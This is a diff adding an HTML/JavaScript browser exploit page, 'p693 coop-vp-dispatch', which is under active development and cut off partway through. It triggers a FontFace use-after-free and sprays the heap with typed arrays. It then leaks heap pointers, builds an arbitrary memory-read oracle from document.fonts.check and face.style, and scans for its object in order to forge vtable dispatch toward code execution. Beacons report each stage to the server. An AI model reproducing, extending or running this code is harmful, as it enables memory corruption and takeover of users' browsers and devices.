@@ -1,0 +1,953 @@
+<!--
+  p693: coop-vp-dispatch — p691 walk + COOP dispatch (real VP or heap copy)
+
+  Query: coop=0 walk-only | coop=1 vptr=VP (module vtable) | coop=2 heap vtable copy
+         pk=N poisons vtable slot N on dispatch (default 4 = fontPropertyChanged)
+         ctl=1 lays out forge but skips setStyle trigger
+
+  Fixes over p690:
+  1. document.fonts.delete(face) BEFORE forgeRead — prevents layout engine from
+     touching the buffer while we reshape it for style-read. face.style (getter)
+     works without the face being in document.fonts.
+  2. document.fonts.add(face) BEFORE the walk trigger (style=italic) — setStyle
+     needs the face in the font set for iterateClients to fire.
+  3. PR #237 walk corrections applied to the LAY step:
+     - m_clients WeakHashSet is 32B on checking build (m_iterators +0x60, m_mutex +0x68)
+     - m_mutex points to a zeroed byte (self+0x50, pre-zeroed)
+     - client at self+0xB8 so base block at client-0x20=self+0x98 sits on the bucket
+     - m_areThreadingChecksEnabled (byte +5 of impl pointer) stays 0
+  4. Synchronous XHR (bs) for all crash-critical beacons
+
+  Base shape: gt=1 rv=6 cli=184 kc=1 bk=1 mt=1 pk=9 (all safe)
+  Poison test: pk=4 (fontPropertyChanged) -> crash = walk reached
+
+  CRASH_CLASS: HIGH
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p693 coop-vp-dispatch</title></head>
+<body>
+<div id="verdict" style="position:sticky;top:0;z-index:9;font:700 15px monospace;padding:.5rem;background:#fff4d6;color:#5a4300;border-bottom:2px solid #d7b34a">RUNNING</div>
+<pre id="out">p693</pre>
+<script>
+'use strict';
+var SKIPJ=-1;
+var O=document.getElementById('out');
+var UID=Math.random().toString(36).slice(2,8).toUpperCase();
+
+/* --- beacon infrastructure --- */
+function b(m){try{O.textContent+='\n'+m;}catch(e){}
+  try{var u=location.protocol+'//'+location.host+'/beacon/P693-'+encodeURIComponent(m)+'?t='+Date.now()+'&u='+UID;if(navigator.sendBeacon&&navigator.sendBeacon(u))return;}catch(e){}
+  try{new Image().src=location.protocol+'//'+location.host+'/beacon/P693-'+encodeURIComponent(m)+'?t='+Date.now();}catch(e){}}
+function bs(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/P693-'+encodeURIComponent(m)+'?t='+Date.now()+'&u='+UID,false);x.send(null);}catch(e){try{b(m+'-XLOST');}catch(e2){}}}
+function verd(k,t){var v=document.getElementById('verdict');v.style.background=(k==='ok')?'#e3f5e6':'#fde2e1';v.style.color=(k==='ok')?'#0f5a20':'#8c1010';v.innerHTML=t;}
+
+/* --- query params --- */
+function qint(n,d){var m=new RegExp('[?&]'+n+'=([^&]*)').exec(location.search);return m?parseInt(m[1],10):d;}
+var K=qint('k',1024), RT=qint('rt',0), PK=qint('pk',4), PW=qint('pw',80), DL=qint('dl',0);
+var GT=qint('gt',0), SI=qint('si',0), RV=qint('rv',6), KC=qint('kc',1), BK=qint('bk',1);
+var MT=qint('mt',1), MP=qint('mp',0), IVP=qint('ivp',0);
+var CLI=qint('cli',184);
+var NL=qint('nl',0); /* no-load control (opening experiment S11-1) */
+var NC=qint('nc',0); /* nocli control: leave impl m_ptr=0 (expired weak) — iterateClients should SKIP instead of vcall */
+var SW=qint('sw',-1),PK2=qint('pk2',-1),SW2=qint('sw2',-1),PK3=qint('pk3',-1),SW3=qint('sw3',-1),EB=qint('eb',0); /* v23/v24/v26: chosen-call + empty-bucket discriminator */
+var RP=qint('rp',0); /* v27: resolve-before-free (cobrajet302gt prediction #295) — defer the free until vf.loaded settles; RAW00 then reads the object in its post-settlement state */
+var FW=qint('fw',0);
+var NP=qint('np',0);
+var VTR=qint('vtr',0);
+var RCW=qint('rcw',0x1000); /* v34: the planted rc word at client-0x20 that real ref()/deref() touch. rcw=0 -> ref() makes 1, deref() drops to 0 -> RefCounted::deref does `delete this` -> ~FontFace (real dtor on our object) then operator delete(client-0x20) = free() at an address WE choose. Crash = died in dtor/free; FAM-AFTER = arbitrary-free footgun acquired. */ /* v33: point the hosted client's vptr at the REAL Client vtable (walk VP) — isolates copied-table flaws (thunk/typeinfo) from object-body kills. Run with pk=-1. */ /* v30b: occupied bucket + dead impl (m_ptr=0) — skipEmptyBuckets bisection of the pre-client kill */ /* v30: yield to the genuine FontFace client (walk FO+0x20) — controls whether the kill is in our fake client's shape (survives) or in the pre-client WeakHashSet/hash walk (dies). */
+var CE=qint('ce',0); /* v29: client-elsewhere — impl m_ptr points at the sk-lane
+       object (firstSpAddr+0x88: vptr→copied table, rc=2@+8, zeros after)
+       instead of the 8-byte client at self+CLI, whose rc@client+8 fell in
+       neighbor-chunk garbage (the yield killer suspect). Run with the bucket
+       OCCUPIED (no eb): survival past FAM-GO = the yield now consults OUR
+       hosted client through OUR copied table. */
+var VB=(function(){var m=/[?&]vb=([0-9a-f]+)/.exec(location.search);return m?parseInt(m[1],16):0x18;})();
+var SV=(function(){var m=location.search.match(/[?&]sv=([^&]*)/);return m?decodeURIComponent(m[1]):'italic';})();
+var CTL=qint('ctl',0), AUTO=qint('auto',0);
+var COOP=qint('coop',1);
+var LK=qint('lk',1);
+
+var SIZE=192, fired=false, faces=null, RTT=0;
+
+/* --- primitives --- */
+function le(v,o){var x=0n;for(var k=7;k>=0;k--)x=(x<<8n)|BigInt(v[o+k]);return x;}
+function put64(u,o,x){for(var k=0;k<8;k++){u[o+k]=Number((x>>BigInt(8*k))&0xFFn);}}
+function put32(u,o,x){u[o]=x&0xFF;u[o+1]=(x>>>8)&0xFF;u[o+2]=(x>>>16)&0xFF;u[o+3]=(x>>>24)&0xFF;}
+function hex(x){return '0x'+x.toString(16);}
+
+/* --- localStorage reset --- */
+if(/[?&]reset=1/.test(location.search)){
+  try{var ks=Object.keys(localStorage);for(var ri=0;ri<ks.length;ri++){if(ks[ri].indexOf('p691')===0)localStorage.removeItem(ks[ri]);}}catch(e){}
+  b('RESET-FULL');document.body.innerHTML='<p style="font:700 26px monospace">p691 reset</p>';
+}
+else if(/[?&]soft=1/.test(location.search)){
+  try{localStorage.removeItem('p691_tries');}catch(e){}
+  b('SOFT');document.body.innerHTML='<p style="font:700 26px monospace">counter cleared</p>';
+}
+else { b('VER-8'); b('BOOT-'+UID+',ctl='+CTL+',coop='+COOP+',rp='+RP+',ce='+CE+',fw='+FW+',np='+NP+',vtr='+VTR+',rcw='+RCW); }
+
+/* --- pre-fault iso-heap: commit pages so PH3 scan doesn't crash on unmapped memory --- */
+var PREFAULT=qint('pf',12000); /* commit 192B pages so PH3/hints do not fault on unmapped VA */
+window.__pf=[];
+for(var pfi=0;pfi<PREFAULT;pfi++){var pb=new Uint8Array(new ArrayBuffer(SIZE));
+  /* 2026-11-18: sign the prefault band too — the scan needs a dense field to
+     locate it; LEAKPIN (+0x58/+0x68 leak words) still pins the true lane. */
+  pb[0x38]=0x00;pb[0x39]=0x10;pb[0x3A]=0x00;pb[0x3B]=0x00;
+  pb[0x3C]=0x00;pb[0x3D]=0x20;pb[0x3E]=0x00;pb[0x3F]=0x00;
+  window.__pf.push(pb);}
+b('PREFAULT-'+PREFAULT);
+
+/* --- spray + UAF trigger --- */
+function start(){
+  var vf;try{vf=new FontFace('vf','local(Helvetica)',{unicodeRange:'U+0041'});}catch(e){b('NOVF');return;}
+  try{document.fonts.add(vf);}catch(e){}
+  try{void vf.loaded;}catch(e){}
+  var fs=document.createElement('style');
+  fs.textContent='@font-face{font-family:v1;src:local(Arial);unicode-range:U+0042;}';
+  document.head.appendChild(fs);
+
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+    if(fired)return undefined;fired=true;
+    var selfFF=this;
+    var body=function(){
+      /* UAF must always free the face. ctl=1 only skips RIP2 setStyle, not this delete. */
+      try{fs.remove();}catch(e){}try{document.fonts.delete(selfFF);}catch(e){}
+      try{document.body.offsetHeight;}catch(e){}
+      window.__sp=[];
+      for(var k=0;k<K;k++){
+        var w=new Uint8Array(new ArrayBuffer(SIZE));
+        w[0x82]=3;
+        w[0]=0;w[1]=0;w[2]=0;w[3]=0x80;
+        var mj=0x1000+k;w[4]=mj&0xFF;w[5]=(mj>>8)&0xFF;w[6]=0;w[7]=0;
+        window.__sp.push(w);
+      }
+    };
+    /* v27: rp=1 defers the free until vf.loaded settles (resolve-before-free,
+       cobrajet302gt prediction #295). Measured 2026-11-18: 3x NOLEAK on the
+       post-reboot console while rp=0 leaked same boot — deferring the free
+       past the settle PREVENTS the landing (the settling engine allocates the
+       landing object; the chunk must already be free). The literal
+       resolve-before-free ordering is untestable here.
+       v28: rp=2 = rp=0 flow + an observer on vf.loaded at getter time. The
+       settle is known to land after the getter and before detection (~46ms),
+       so R2-SETTLED beacon order vs RAW00 (server timestamps) decides it:
+       R2-SETTLED < RAW00  -> RAW00 word is already the post-settle state.
+       No re-read inside the waiter: step 2 plants rc=2 at +0x00 synchronously
+       right after detection, so any microtask-fired re-read is polluted. */
+    if(RP===1){
+      try{vf.loaded.then(function(){bs('RP-SETTLED');body();},
+        function(){bs('RP-SETTLED-R');body();});}
+      catch(e){bs('RP-ERR');body();}
+    }else{
+      if(RP===2){try{vf.loaded.then(function(){bs('R2-SETTLED');},
+        function(){bs('R2-SETTLED-R');});}catch(e){bs('R2-ERR');}}
+      body();}
+    return undefined;
+  },set:function(){}});
+
+  document.fonts.load('1em vf, v1','AB').then(function(f){faces=f;b('RES-n'+f.length);setTimeout(phase,PW);},
+                                               function(e){b('RJ-'+String(e&&e.name));});
+  setTimeout(function(){if(!faces)b('NOFACES');},1500);
+}
+
+/* --- main analysis chain --- */
+function phase(){
+  var bufs=[],bufl1=[],L1=0n,L2=0n,rawL=null,cands=[];
+  if(RT>0){RTT=setTimeout(function(){location.href=location.href.replace(/([?&])rt=\d+/,'$1rt='+(RT-1));},30000);}
+
+  /* Step 1: hit detection + leak L1/L2 */
+  for(var i=0;i<window.__sp.length;i++){
+    var a=le(window.__sp[i],0x58),c=le(window.__sp[i],0x68);
+    if(a>0x1000000000n){bufs.push([window.__sp[i],c,i]);cands.push([window.__sp[i],c]);bufl1.push(a);if(!rawL)rawL=[a,c];
+      /* v27 (cobrajet302gt prediction #295): raw engine value of +0x00/+0x10
+         at detection, BEFORE any plant (LAY later overwrites +0x00 with rc=2).
+         rp=1 (promise settled pre-free): flip 1→0 = DOMPromiseProxy confirmed.
+         rp=0 baseline: expect +0x00=1 (rc, FONTFACE_RECLAIM_LEAK:55-61). */
+      b('RAW00-'+hex(le(window.__sp[i],0))+',X10-'+hex(le(window.__sp[i],0x10)));}
+  }
+  if(rawL){L1=rawL[0];L2=rawL[1];}
+  b('L1-'+hex(L1));b('L2-'+hex(L2));
+  if(!bufs.length||L2===0n){b('NOLEAK');verd('bad','NOLEAK');return;}
+
+  /* Step 2: initial forge — set refcount, copy L2, clear status */
+  for(var ib=0;ib<bufs.length;ib++){var vb=bufs[ib][0];vb[0]=2;put64(vb,0x08,bufs[ib][1]);vb[0x10]=0;vb[0x82]=0;}
+  b('FORGED-'+bufs.length);
+
+  /* Step 3: re-add faces, find oracle face (setTimeout chain) */
+  setTimeout(function(){
+    for(var i2=0;i2<faces.length;i2++){try{faces[i2].family='zz'+i2;}catch(e){}}
+    b('FAMILY-OK');
+    setTimeout(function(){
+      for(var i3=0;i3<faces.length;i3++){try{document.fonts.add(faces[i3]);}catch(e){}}
+      b('ADD-OK');
+      setTimeout(function(){
+        var fam=null,zi=-1;
+        for(var q=0;q<faces.length;q++){var r=null;try{r=document.fonts.check('1em zz'+q,'A');}catch(e){}if(r===false){fam='zz'+q;zi=q;window.__zi=q;break;}}
+        b('INTABLE-'+fam);
+        if(!fam){b('NOTIN');verd('bad','NOTIN');return;}
+
+        /* set ranges count/capacity on all hit buffers */
+        for(var is=0;is<bufs.length;is++){bufs[is][0][0x28]=1;bufs[is][0][0x2C]=1;}
+
+        /* --- oracle functions --- */
+        var self=0n,selfFound=false;
+
+        function setR(t){for(var ir=0;ir<bufs.length;ir++){if(SKIPJ>=0&&bufs[ir][0]===window.__sp[SKIPJ])continue;put64(bufs[ir][0],0x20,t);}}
+        function chk(c){try{return document.fonts.check('1em '+fam,String.fromCodePoint(c))===false;}catch(e){return null;}}
+        /* v8 LEAKPIN (2026-11-18): engine writes ONLY +0x00=1, +0x58=L1,
+           +0x68=L2 into the reclaimed lane — zero everywhere else
+           (FONTFACE_RECLAIM_LEAK_14_10.md:55-61; doc-audit confirmed). So the
+           TO word of the +0x6C pair is u32@+0x70 = opCount, a plain counter —
+           safe to plant (forgeRead has always written it). We plant 0x2000 at
+           +0x70 on EVERY lane: reclaim lane pair@+0x6C = (L2 high dword = 1,
+           0x2000) => chk(0)===false && chk(1)===true; spray lanes have +0x68=0
+           => from=0 => chk(0)===true. Unique discriminator on L2. */
+        function leakPin(cand){
+          setR(cand+0x6Cn);
+          return chk(0)===false&&chk(1)===true;
+        }
+        function boundary(tgt){
+          /* v7 (2026-11-18): semantics calibrated on-device (CAL38-00011110000):
+             chk(c)===true <=> from<=c<=to with from=u32@aim, to=u32@(aim+4).
+             Returns from (smallest true), -1 for an empty range. The old body
+             had the polarity inverted and always returned -1 — the pair reader
+             never worked before this fix. */
+          setR(tgt);
+          var lo=0,hi=0x10FFFF;
+          while(lo<hi){var mid=(lo+hi)>>1;var r=chk(mid);if(r===null)return -1;
+            if(r===true)hi=mid;else lo=mid+1;}
+          return (chk(lo)===true)?lo:-1;
+        }
+        function toOf(tgt){
+          /* v10 (2026-11-18): largest c with chk(c)===true = the TO word of
+             the pair at aim. -1 if none. Descending counterpart of boundary(). */
+          setR(tgt);
+          if(chk(0)!==true)return -1;
+          var lo=0,hi=0x10FFFF;
+          while(lo<hi){var mid=(lo+hi+1)>>1;var r=chk(mid);if(r===null)return -1;
+            if(r===true)lo=mid;else hi=mid-1;}
+          return (chk(lo)===true)?lo:-1;
+        }
+
+        /* --- style-read mechanism --- */
+        function forgeRead(daddr,dlen){
+          for(var ib2=0;ib2<window.__sp.length;ib2++){
+            var vb2=window.__sp[ib2];if(!vb2)continue;
+            if(SKIPJ>=0&&ib2===SKIPJ)continue;
+            if(selfFound){put64(vb2,0x08,self+0x70n);vb2[0x10]=0;}
+            put32(vb2,0x30,4);put32(vb2,0x34,dlen);put64(vb2,0x38,daddr);put32(vb2,0x40,4);
+            vb2[0x44]=0x7A;vb2[0x45]=0x7A;vb2[0x46]=0x71;
+            put32(vb2,0x70,4);
+            put32(vb2,0x74,0x10);vb2[0x78]=14;vb2[0x79]=0;
+            if(selfFound)put64(vb2,0x7A,self+0x90n);
+            put32(vb2,0x90,3);put32(vb2,0x94,72);
+            if(selfFound)put64(vb2,0x98,self+0x30n);
+          }
+        }
+        function dec(s,lim){
+          var by=[],q2=(s.charAt(0)==='"')?1:0,e=(s.slice(-1)==='"')?s.length-1:s.length,k=q2;
+          while(k<e&&by.length<lim){var ch=s.charAt(k);
+            if(ch==='\\'){k++;var hh='';while(k<e&&hh.length<6&&/[0-9a-fA-F]/.test(s.charAt(k))){hh+=s.charAt(k);k++;}
+              if(hh.length===0){if(k<e){by.push(s.charCodeAt(k));k++;}}
+              else{if(s.charAt(k)===' ')k++;var cp=parseInt(hh,16);if(cp>255)cp&=0xFF;by.push(cp);}}
+            else{by.push(s.charCodeAt(k));k++;}}
+          var h='';for(var j=0;j<by.length;j++)h+=('0'+by[j].toString(16)).slice(-2);return h;
+        }
+        function readStyle(){
+          if(zi<0)return '';
+          try{return dec(String(faces[zi].style),128);}catch(e){return 'THROW';}
+        }
+        function readLeHex(hexStr,off){
+          var s=hexStr.slice(off*2,off*2+16);
+          if(!/^[0-9a-f]{16}$/.test(s))return 0n;
+          return BigInt('0x'+s.match(/../g).reverse().join(''));
+        }
+
+        /* --- Step 4: oracle validation --- */
+        var t1=-1,l2i=-1;
+        b('DIAG-bufs='+bufs.length+',fam='+fam+',zi='+zi);
+        for(var q8=0;q8<bufs.length;q8++){
+          L1=bufl1[q8];L2=bufs[q8][1];
+          var dCnt=bufs[q8][0][0x28],dCap=bufs[q8][0][0x2C];
+          b('DIAG-q'+q8+'-L2='+hex(L2)+',cnt='+dCnt+',cap='+dCap);
+          setR(L2+0x07n);
+          var dc0=chk(0),dc1=chk(0x41),dc2=chk(0x100);
+          b('DIAG-q'+q8+'-chk0='+dc0+',chk41='+dc1+',chk100='+dc2);
+          var d20=hex(le(bufs[q8][0],0x20));
+          b('DIAG-q'+q8+'-ptr20='+d20);
+          t1=boundary(L2+0x07n);
+          if(t1>=0){l2i=q8;break;}
+        }
+        if(l2i>0)b('L2SEL-'+l2i);
+        if(l2i<0){L1=bufl1[0];L2=bufs[0][1];}
+
+        var oracleAlive=(t1>=0);
+        /* oracle content-dependence test (2026-11-18): chk must differ across
+           distinct targets, else the coverage read no longer derefs lane+0x20
+           and every signature scan is constant-false noise. */
+        setR(L2+0x07n);var o1=chk(0x41);
+        setR(L1+0x07n);var o2=chk(0x41);
+        setR(L2+0x07n);var o3=chk(0x41);
+        bs('ORACLE-TEST-'+o1+','+o2+','+o3+((o1===null||o2===null)?'-NULL':(o1!==o2?'-DIFF':'-CONST')));
+        if(!oracleAlive){
+          // FIX: set status=3 + use L1-0x0C for range (gives from=keyCount,to=tableSizeMask)
+          b('A-DEAD-FIXING');
+          for(var ipd=0;ipd<bufs.length;ipd++){var vpd=bufs[ipd][0];
+            vpd[0x82]=3; // Status::Success
+            vpd[0x38]=0x00;vpd[0x39]=0x10;vpd[0x3A]=0x00;vpd[0x3B]=0x00;
+            vpd[0x3C]=0x00;vpd[0x3D]=0x20;vpd[0x3E]=0x00;vpd[0x3F]=0x00;}
+          // Try L1-0x0C: hash table metadata has small numbers in range
+          setR(L1-0x0Cn);
+          t1=boundary(L1-0x0Cn);
+          b('A-RETRY-L1m0C-t1='+t1);
+          if(t1<0){
+            // Try L1-0x08
+            setR(L1-0x08n);
+            t1=boundary(L1-0x08n);
+            b('A-RETRY-L1m08-t1='+t1);
+          }
+          if(t1<0){
+            // Try L1-0x10
+            setR(L1-0x10n);
+            t1=boundary(L1-0x10n);
+            b('A-RETRY-L1m10-t1='+t1);
+          }
+          oracleAlive=(t1>=0);
+        }
+        /* EHT removed: readStyle() without selfFound poisons the WeakPtrImpl backing,
+           causing all subsequent face.style calls to return "normal" instead of
+           binary data from the forged address. The NOBUCKET problem must be solved
+           differently — either speed up PH3 or read the hash table immediately
+           after selfFound is set (before the bucket data decays). */
+
+        var t2=-1,c0=false;
+        if(oracleAlive){
+          b('HIGH-0x'+t1.toString(16));
+          t2=boundary(L2+0x06n);
+          if(t2<0){b('B-DEAD');}else{b('B2-0x'+(t2&0xFF).toString(16));}
+          setR(L2+0x05n);
+          c0=chk(0);
+          b('B0CLASS-'+(c0===true?'lo-hi':(c0===false?'mid':'?')));
+        }
+
+        /* --- Step 5: Phase 2 — Client scan --- */
+        var B2=BigInt((t2>=0)?(t2&0xFF):Number((L2>>16n)&0xFFn));
+        var B2L=Number((L2>>16n)&0xFFn);
+        var fromExp=BigInt(B2L)|0x100000n;
+        var B0s=(c0===false)?[0x10,0x20,0x30,0x40,0x50,0x60,0x70]:[0x00,0x80,0x90,0xa0,0xb0,0xc0,0xd0,0xe0,0xf0];
+        var found=0n,ntry=0;
+        b('PH2-START-b0='+B0s.length);
+
+        try{var pv=BigInt('0x'+(localStorage.getItem('p691_cli')||'0'));
+          if(pv>0x1000000000n){setR(pv+0x0Bn);if(chk(0x1000)===true&&chk(0xFFF)===false){found=pv;b('CLIENT-CACHED-0x'+pv.toString(16));}}}catch(e){}
+
+        var b1L=Number((L2>>8n)&0xFFn);
+        var ST=null;try{ST=JSON.parse(localStorage.getItem('p691_st')||'null');}catch(e){}
+        var startI=0;
+        if(ST&&ST.B2===Number(B2)&&ST.b1L===b1L&&ST.c0===(c0===false)){
+          startI=(ST.i|0);if(startI>4)startI-=4;b('PH2-RESUME-'+startI);
+        }else{b('PH2-FRESH');startI=0;try{localStorage.setItem('p691_st',JSON.stringify({B2:Number(B2),b1L:b1L,c0:(c0===false),i:0}));}catch(e){}}
+
+        var B1s=[];for(var q1=0;q1<256;q1++)B1s.push(q1);
+        B1s.sort(function(x,y){return Math.abs(x-b1L)-Math.abs(y-b1L);});
+
+        if(found===0n){
+          /* ungated 2026-11-18: oracleAlive was chronically false (boundary
+             self-test needs chk(0)===true, never observed), yet hint-signature
+             checks with the same chk pattern worked in the SELF lineage.
+             PH2's chk-based sweep is content-driven and safe to run ungated. */
+          for(var i5=0;i5<B0s.length;i5++){
+            var brk=false;
+            for(var q2b=0;q2b<256;q2b++){
+              var b1=B1s[q2b];
+              var cand=BigInt(B0s[i5])|(BigInt(b1)<<8n)|(B2<<16n)|(0x10n<<32n);
+              if(ntry<startI){ntry++;continue;}
+              setR(cand+0x0Bn);ntry++;
+              if((ntry&7)===0){try{localStorage.setItem('p691_st',JSON.stringify({B2:Number(B2),b1L:b1L,c0:(c0===false),i:ntry}));}catch(e){}}
+              if(chk(0x1000)===true&&chk(0xFFF)===false){
+                setR(cand+0x0An);
+                var s1=chk(Number(fromExp&0x1FFFFFn));
+                b('CAND-0x'+cand.toString(16)+',s1='+s1);
+                if(s1===true){found=cand;brk=true;break;}
+            }
+              if((ntry%64)===0)b('PH2-'+ntry);
+            }
+            if(brk)break;
+          }
+        }
+        b('PH2-END-ntry='+ntry);
+        if(!found){
+          /* fall through to hints/PH3 even after a real sweep misses (2026-11-18) */
+          b('PH2-NOMATCH-FALLTHRU');
+        }else{
+          try{localStorage.removeItem('p691_st');}catch(e){}
+          try{localStorage.setItem('p691_cli',found.toString(16));}catch(e){}
+          b('CLIENT-0x'+found.toString(16));
+        }
+
+        /* --- Step 6: Phase 3 — Self scan --- */
+        for(var ip=0;ip<window.__sp.length;ip++){var vp=window.__sp[ip];
+          /* 2026-11-18: signature the WHOLE spray band, not just bufs — the PH3
+             scan can only find lanes that actually carry the planted words. */
+          if(SKIPJ>=0&&ip===SKIPJ)continue;
+          vp[0x82]=0; // CRITICAL: status=Loading so oracle works (status=3 breaks it)
+          vp[0x28]=1;vp[0x29]=0;vp[0x2A]=0;vp[0x2B]=0; // capacity=1
+          vp[0x2C]=1;vp[0x2D]=0;vp[0x2E]=0;vp[0x2F]=0; // size=1
+          vp[0x38]=0x00;vp[0x39]=0x10;vp[0x3A]=0x00;vp[0x3B]=0x00;
+          vp[0x3C]=0x00;vp[0x3D]=0x20;vp[0x3E]=0x00;vp[0x3F]=0x00;
+          put32(vp,0x70,2+ip); /* v10: per-lane unique TO-word (lane index) —
+                                   identity pin: toOf(+0x6C) == 2+idxRe means
+                                   THIS address is bufs[0]'s lane */}
+        var idxRe=bufs[(l2i>=0)?l2i:0][2];
+        bs('IDXRE-'+idxRe);
+
+        if(!selfFound&&found){
+          setR(found+0x48n);
+          if(chk(0x1000)===true&&chk(0xFFF)===false&&chk(0x2000)===true&&chk(0x2001)===false
+             &&leakPin(found+0x10n)){
+            self=found+0x10n;selfFound=true;b('SELF-DER-0x'+self.toString(16));
+          }
+        }
+
+        if(!selfFound){
+          /* Measured pairs: L1=0x1000e04dd0 -> SELF +0x1D4B0 / +0x214B0.
+             Page scan steps 0x80 and skips this remainder. */
+          var hints=[L1+0x1D4B0n,L1+0x214B0n,L1+0x1D480n,L1+0x21480n,
+                     L2-0x156D40n,L2-0x156E40n,
+                     0x1000e22280n,0x1000e26280n,0x1000e32280n,0x1000e36280n,0x1000380480n,0x1000384480n];
+          var tails=[0x0480n,0x0680n,0x0c80n,0x2280n,0x2680n,0x3280n,0x3680n,0x4480n];
+          var bases=[];
+          for(var bo=-1;bo<=4;bo++)bases.push((L1+BigInt(bo)*0x10000n)&~0xFFFFn);
+          for(var bi=0;bi<bases.length;bi++){
+            for(var ti=0;ti<tails.length;ti++)hints.push(bases[bi]+tails[ti]);
+          }
+          bs('HINTS-'+hints.length+',L1b2='+(Number((L1>>16n)&0xFFn)));
+          for(var hi=0;hi<hints.length&&!selfFound;hi++){
+            setR(hints[hi]+0x38n);
+            if(chk(0x1000)===true&&chk(0xFFF)===false&&chk(0x2000)===true&&chk(0x2001)===false){
+              if(leakPin(hints[hi])){self=hints[hi];selfFound=true;bs('SELF-HINT-'+hex(self));}
+              else bs('HINT-STALE-'+hex(hints[hi]));
+            }
+          }
+        }
+
+        if(!selfFound){
+          try{
+            var cachedSelf=BigInt('0x'+(localStorage.getItem('p691_self')||'0'));
+            if(cachedSelf>0x1000000000n){
+              setR(cachedSelf+0x38n);
+              if(chk(0x1000)===true&&chk(0xFFF)===false&&chk(0x2000)===true&&chk(0x2001)===false){
+                if(leakPin(cachedSelf)){
+                  self=cachedSelf;selfFound=true;b('SELF-CACHED-'+hex(self));
+            }else{
+                  b('SELF-STALE');
+                  try{localStorage.removeItem('p691_self');}catch(eS){}
+            }
+            }else{
+                b('SELF-STALE');
+                try{localStorage.removeItem('p691_self');}catch(eS){}
+            }
+            }
+          }catch(eC){}
+        }
+
+        /* Only pages already touched by the hint list (same 64K as L1). */
+        if(!selfFound){
+          /* v14: FIXED window. L1-anchoring broke on the 01:36 boot (L1 jumped
+             to 0x1000ff8dd0; only the sp tail was in-window, the reclaim lane
+             stayed 7MB below the anchor). All boots tonight kept every band
+             inside [0x1000890000, 0x1001090000) — pf ~0x1000904xxx is the
+             first big allocation of a fresh WebProcess. 9MB fixed covers all
+             observed layouts with margin. */
+          var page0=0x1000890000n;
+          var n3=0;
+          bs('PH3-PAGE-'+hex(page0));
+          var laneHits=0,spLanes=0,firstSpAddr=0n,firstSpIdx=-1;
+          for(var pg=0;pg<144&&!selfFound;pg++){
+            var base=page0+BigInt(pg)*0x10000n;
+            var pgHits=0;
+            for(var off=0;off<0x10000&&!selfFound;off+=0x80){
+              var sc=base+BigInt(off);
+              setR(sc+0x38n);n3++;
+              if(chk(0x1000)===true&&chk(0xFFF)===false&&chk(0x2000)===true&&chk(0x2001)===false){
+                pgHits++;laneHits++;
+                /* v9 pin: aim +0x6C. pf lanes: pair (0,0) => chk(0)T,chk(1)F.
+                   sp spray: (0,0x2000 planted) => both T. reclaim: (1,0x2000)
+                   => chk(0)F & chk(1)T — the only p0-false lane. */
+                setR(sc+0x6Cn);var p0=chk(0),p1=chk(1);
+                if(p0===true&&p1===true){
+                  spLanes++;
+                  /* v10 identity pin: TO word == 2+laneIndex (per-lane plant).
+                     The address whose toOf == 2+idxRe IS bufs[0]'s lane —
+                     address by identity, independent of engine write patterns. */
+                  var toV=toOf(sc+0x6Cn);
+                  if(toV>=2&&firstSpAddr===0n){firstSpAddr=sc;firstSpIdx=toV-2;}
+                  if(toV===2+idxRe){
+                    self=sc;selfFound=true;bs('SELF-IDPIN-'+hex(sc)+'-to'+toV);
+                    var fchk=boundary(sc+0x6Cn);
+                    bs('IDPIN-FROM-'+fchk+(fchk===1?'-L2HD-OK':'-UNEXPECTED'));
+            }else if(toV>=2&&spLanes<=3){bs('SPMAP-'+hex(sc)+'-i'+(toV-2));}
+            }
+                if(p0===false&&!selfFound){
+                  /* v11: p0===false ALONE pins the reclaim lane. Only it has
+                     from>=1 at +0x6C (engine-written L2 high dword). pf=(0,0),
+                     spray=(0,2+i) both give chk(0)=true. Engine owns +0x70
+                     (opCount) on the live lane and clobbers our marker, so the
+                     pair may read (1,0)=empty => p1=false — still a pin. */
+                  self=sc;selfFound=true;bs('SELF-LEAKPIN-'+hex(sc)+'-p1='+p1);
+                  bs('LEAKPIN-FROM-'+boundary(sc+0x6Cn));
+            }
+                if(!selfFound){
+                  if(laneHits===1){
+                    /* calibration sweep on known-content targets:
+                       +0x38 planted 0x1000 | +0x58 expected 0 or leak ptr
+                       | +0x68 expected 0 or leak ptr. Order: CP below. */
+                    var CP=[1,0xFFE,0xFFF,0x1000,0x1001,0x1FFF,0x2000,0x2001,0x7FFF,0xFFFE,0xFFFF];
+                    var c38='',c58='',c68='';
+                    setR(sc+0x38n);for(var cc=0;cc<CP.length;cc++)c38+=(chk(CP[cc])===true?'1':'0');
+                    setR(sc+0x58n);for(var cc2=0;cc2<CP.length;cc2++)c58+=(chk(CP[cc2])===true?'1':'0');
+                    setR(sc+0x68n);for(var cc3=0;cc3<CP.length;cc3++)c68+=(chk(CP[cc3])===true?'1':'0');
+                    bs('CAL38-'+c38);bs('CAL58-'+c58);bs('CAL68-'+c68);
+                    bs('LPRAW-p0='+p0+',p1='+p1);
+            }
+                  if(laneHits<=3)bs('LANEHIT-'+hex(sc)+'-p0='+p0+',p1='+p1);
+            }
+            }
+            }
+            bs('PH3-PG'+pg+'-n'+n3+'-h'+pgHits);
+          }
+          bs('PH3-LANES-'+laneHits+'-SPBAND-'+spLanes);
+          bs('PH3-END-n3='+n3+',hit='+selfFound);
+          if(!selfFound){
+            /* fine stride over the old-lineage L1->SELF delta band
+               (+0x1C000..+0x24000): tests both the delta hypothesis and the
+               0x80-alignment hole in one pass (2026-11-18). */
+            var fb=(L1&~0xFFFFn)+0x1C000n;
+            var n4=0;
+            bs('PH3F-START-'+hex(fb));
+            for(var fo=0;fo<0x8000&&!selfFound;fo+=0x10){
+              var sf=fb+BigInt(fo);
+              setR(sf+0x38n);n4++;
+              if(chk(0x1000)===true&&chk(0xFFF)===false&&chk(0x2000)===true&&chk(0x2001)===false){
+                self=sf;selfFound=true;bs('SELF-FINE-'+hex(sf));
+            }
+            }
+            bs('PH3F-END-n4='+n4+',hit='+selfFound);
+          }
+        }
+
+        if(!selfFound){
+          bs('NOSELF');
+          /* NOSELF read ladder (2026-11-17, pre-registered).
+             Q1 ground truth: aim [L1..L1+16). Lane +0x00=0x02 and +0x08=L2 were
+             planted early and forgeRead never touches +0x00..+0x10 without
+             selfFound. Bytes 8..15 == LE(L2) => forge window consumable WITHOUT
+             SELF and L1 derefs into a planted lane. Keyword/"normal" => not
+             consumable without SELF wiring.
